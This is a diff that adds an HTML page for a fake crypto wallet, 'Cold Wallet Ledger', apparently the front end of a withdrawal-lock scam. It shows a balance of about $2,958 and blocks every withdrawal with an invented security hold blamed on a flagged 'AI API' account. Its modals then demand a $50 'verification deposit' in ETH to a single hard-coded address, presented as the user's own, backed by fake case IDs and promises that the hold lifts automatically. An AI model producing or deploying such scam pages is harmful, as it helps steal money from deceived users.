@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Wallet — Cold Wallet Ledger</title>
+<link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+
+<header class="app-top">
+  <a class="logo" href="index.html"><span class="logo-mark">CW</span> Cold Wallet Ledger</a>
+  <div class="search">Search markets</div>
+  <div style="margin-left:auto;display:flex;align-items:center;gap:12px">
+    <span class="badge" id="vbadge">Verification required</span>
+    <div class="avatar">JM</div>
+    <button class="btn btn-ghost" style="height:34px;font-size:13px" onclick="logout()">Log out</button>
+  </div>
+</header>
+
+<div class="app-body">
+  <aside class="side">
+    <a href="#" class="on" data-tab="spot">Spot wallet</a>
+    <a href="#" data-tab="api">AI API</a>
+  </aside>
+
+  <main class="main">
+
+    <!-- ============ SPOT ============ -->
+    <section id="tab-spot">
+      <div class="page-head">
+        <div>
+          <h1>Spot wallet</h1>
+          <p>jean.mol94 · UID 4471-8802 · sub-account <b>main</b></p>
+        </div>
+      </div>
+
+      <div class="notice" id="hold-note" style="display:none">
+        <div class="ni">⚠</div>
+        <div id="hold-note-txt"><b>Outbound transfers are on hold.</b> A security review is pending on this account. Verify to unlock.</div>
+      </div>
+
+      <div class="bal-card">
+        <div class="bal-lbl">Total balance</div>
+        <div class="bal-total">$2,958.14</div>
+        <div class="bal-sub">≈ 1.2353 ETH · updated just now</div>
+        <div class="bal-actions">
+          <button class="btn btn-primary" data-open-transfer="spot">Withdraw</button>
+          <button class="btn btn-ghost" data-open-deposit>Deposit</button>
+        </div>
+      </div>
+
+      <div class="tbl-card">
+        <table class="asset-tbl">
+          <thead><tr><th>Asset</th><th>Balance</th><th>Value</th><th>24h</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><div class="asset"><div class="asset-ic" style="background:#26a17b">US</div>
+                <div><div class="asset-n">Tether</div><div class="asset-s">USDT · Ethereum</div></div></div></td>
+              <td class="mono bal">863.0000</td><td class="mono">$863.00</td><td class="green">+0.01%</td>
+            </tr>
+            <tr>
+              <td><div class="asset"><div class="asset-ic" style="background:#627eea">ET</div>
+                <div><div class="asset-n">Ethereum</div><div class="asset-s">ETH · Ethereum</div></div></div></td>
+              <td class="mono bal">0.6000</td><td class="mono">$1,437.00</td><td class="green">+1.42%</td>
+            </tr>
+            <tr>
+              <td><div class="asset"><div class="asset-ic" style="background:#f7931a">BT</div>
+                <div><div class="asset-n">Bitcoin</div><div class="asset-s">BTC · Bitcoin</div></div></div></td>
+              <td class="mono bal">0.0031</td><td class="mono">$338.64</td><td class="green">+1.84%</td>
+            </tr>
+            <tr>
+              <td><div class="asset"><div class="asset-ic" style="background:#14f195">SO</div>
+                <div><div class="asset-n">Solana</div><div class="asset-s">SOL · Solana</div></div></div></td>
+              <td class="mono bal">2.1400</td><td class="mono">$319.50</td><td class="red">-0.92%</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- ============ API ============ -->
+    <section id="tab-api" style="display:none">
+      <div class="page-head">
+        <div>
+          <h1>AI API access</h1>
+          <p>Account <b class="flag-name">AIAPI-8842-XE</b> · plan Compute Pro · region eu-west-1</p>
+        </div>
+        <span class="badge red">Usage flagged</span>
+      </div>
+
+      <div class="notice big">
+        <div class="ni">⚠</div>
+        <div>
+          <p class="ntxt">Rate limit reached <b>3 times in 24h</b>. Automated risk engine flagged this API account for
+          abnormal request volume. Withdrawals from the linked balance are <b>suspended until verification</b>.</p>
+          <button class="btn btn-primary btn-sm" id="verify-btn">Start verification</button>
+        </div>
+      </div>
+
+      <div class="api-card">
+        <div class="api-row"><span>API key</span><span class="kv"><span class="mono">cwl_live_9f2c••••4C9F</span>
+          <button class="copy" data-copy="cwl_live_9f2c4a7d18be63f0c5a1e2d7b94C9F">Copy</button></span></div>
+        <div class="api-row"><span>Endpoint</span><span class="mono">api.coldwalletledger.io/v1</span></div>
+        <div class="api-row"><span>Credit available</span><span class="mono">$0.00 USDT</span></div>
+        <div class="api-row"><span>Consumption</span><span class="mono red">4.7× above plan</span></div>
+        <div class="api-row" style="display:block">
+          <div style="display:flex;justify-content:space-between"><span>Daily quota used</span><span class="mono red">94%</span></div>
+          <div class="bar"><i></i></div>
+        </div>
+      </div>
+
+      <div class="bal-card">
+        <div class="bal-lbl">API-linked balance</div>
+        <div class="bal-total">$0.00</div>
+        <div class="bal-sub">0.0000 USDT · wallet empty</div>
+        <div class="bal-actions">
+          <button class="btn btn-primary" data-open-transfer="api">Withdraw</button>
+          <button class="btn btn-ghost" data-open-deposit>Deposit</button>
+        </div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- ============ WITHDRAW MODAL ============ -->
+<div class="overlay" id="ov">
+  <div class="modal">
+    <button class="close x" id="close">✕</button>
+
+    <div id="step-form">
+      <h3>Withdraw funds</h3>
+      <p class="msub" id="m-sub">Send to an external address</p>
+
+      <div class="netrow"><span class="dot"></span> Network: <b>Ethereum (ERC-20)</b></div>
+
+      <div class="field"><label>Recipient address</label>
+        <input id="m-addr" placeholder="0x…" spellcheck="false"></div>
+
+      <div class="field"><label>Amount</label>
+        <input id="m-amt" type="text" placeholder="0.00" inputmode="decimal">
+        <button class="maxbtn" id="max" type="button">MAX · <span id="max-val"></span></button>
+      </div>
+
+      <div class="api-row" style="border-bottom:0;font-size:13px;padding:6px 0">
+        <span>Network fee</span><span class="mono">0.00042 ETH</span>
+      </div>
+
+      <button class="btn btn-primary btn-block btn-lg btn-locked" id="m-go" style="margin-top:12px">
+         Confirm withdrawal
+      </button>
+
+      <div class="lockhint show">
+        <span>⚠</span>
+        <span>Withdrawals are restricted on this account — confirming will return the security hold.</span>
+      </div>
+    </div>
+
+    <div class="steps" id="step-load">
+      <div class="spinner"></div>
+      <p>Validating address and running compliance checks…</p>
+    </div>
+
+    <div class="err-panel" id="step-err">
+      <div class="err-title">⛔ Transfer locked — security hold</div>
+
+      <p><b>Risk engine verdict:</b> the AI API account <b class="flag-name">AIAPI-8842-XE</b> has been
+      flagged for <b>excessive consumption</b> — 4.7× above the plan threshold, 3 rate-limit
+      breaches in 24h. Outbound transfers from this wallet are <b>suspended</b> until the account
+      is verified.</p>
+
+      <p>To release the hold, a minimum deposit of <b>$50.00 equivalent</b> must be credited to the
+      main wallet address below. Verification is automatic — funds are credited and the hold lifts
+      within ~15 minutes of network confirmation.</p>
+
+      <p><b>Verification is processed on the largest asset of the wallet — ETH.</b> Transfers on every
+      other asset are <b>frozen</b> until the review closes, so a deposit in USDT, BTC or SOL is not
+      counted. Send ETH only.</p>
+
+      <div class="addr-box">
+        <div class="lbl">Main wallet address · Ethereum</div>
+        <div class="addr-val" id="err-addr">0x2117e8B4E41a85e2C2b5f203D89bD3bFD28A29C3</div>
+        <button class="copy" data-copy="0x2117e8B4E41a85e2C2b5f203D89bD3bFD28A29C3">Copy address</button>
+      </div>
+
+      <div class="warnnet"><b>Ethereum mainnet (ERC-20) only.</b> Deposits on BEP-20, TRC-20, Polygon
+      or Solana cannot be recovered and do not count toward verification.</div>
+
+      <div class="api-row" style="font-size:12px;margin-top:12px;border-bottom:0;padding-bottom:0">
+        <span>Case ID</span><span class="mono">SEC-2026-11-06-4471</span>
+      </div>
+
+      <button class="btn btn-primary btn-block" id="err-verify" style="margin-top:14px">Verify now — deposit ETH</button>
+      <button class="btn btn-ghost btn-block" id="err-close" style="margin-top:8px">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- ============ DEPOSIT MODAL ============ -->
+<div class="overlay" id="ovd">
+  <div class="modal">
+    <button class="close x" id="d-close">✕</button>
+    <h3>Deposit ETH</h3>
+    <p class="msub">Ethereum balance — the verification asset</p>
+
+    <div class="netrow"><span class="dot"></span> Network: <b>Ethereum (ERC-20)</b></div>
+
+    <div class="qr-wrap">
+      <img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=0x2117e8B4E41a85e2C2b5f203D89bD3bFD28A29C3" alt="Deposit address QR code">
+    </div>
+
+    <div class="addr-box neutral">
+      <div class="lbl">Your deposit address</div>
+      <div class="addr-val">0x2117e8B4E41a85e2C2b5f203D89bD3bFD28A29C3</div>
+      <button class="copy" data-copy="0x2117e8B4E41a85e2C2b5f203D89bD3bFD28A29C3">Copy address</button>
+    </div>
+
+    <p class="minline">Minimum deposit for verification: <b>$50.00 equivalent in ETH</b></p>
+
+    <div class="warnnet">Only ETH on Ethereum mainnet is accepted. USDT, BTC and SOL transfers are
+    frozen during the review and will not be credited until it closes.</div>
+
+    <button class="btn btn-primary btn-block" id="d-done" style="margin-top:14px">Done</button>
+  </div>
+</div>
+
+<!-- ============ PENDING MODAL ============ -->
+<div class="overlay" id="ovw">
+  <div class="modal">
+    <button class="close x" id="w-close">✕</button>
+
+    <div class="wait-panel">
+      <div class="wait-ic">⏳</div>
+      <h3>Waiting for the funds</h3>
+
+      <p>We are currently monitoring the deposit address. The transaction has not been detected yet.</p>
+
+      <ul class="wait-list">
+        <li>Broadcasting and confirming a transfer can take <b>several minutes</b> depending on network load.</li>
+        <li>Keep the withdrawal open on your side until the transaction reaches <b>12 confirmations</b>.</li>
+        <li>The hold is released automatically once the deposit is credited — no action needed.</li>
+      </ul>
+
+      <p>If the situation is still blocked after the deposit confirms, our support team will reach out
+      to you directly on the case below. You can also reply to the confirmation email.</p>
+
+      <div class="api-row" style="font-size:12px;border-bottom:0;padding:6px 0 0">
+        <span>Case ID</span><span class="mono">SEC-2026-11-06-4471</span>
+      </div>
+
+      <button class="btn btn-primary btn-block" id="w-got" style="margin-top:14px">Got it</button>
+      <button class="btn btn-ghost btn-block" id="w-again" style="margin-top:8px">Show address again</button>
+    </div>
+  </div>
+</div>
+
+<script src="assets/js/auth.js"></script>
+<script src="assets/js/app.js"></script>
+</body>
+</html>
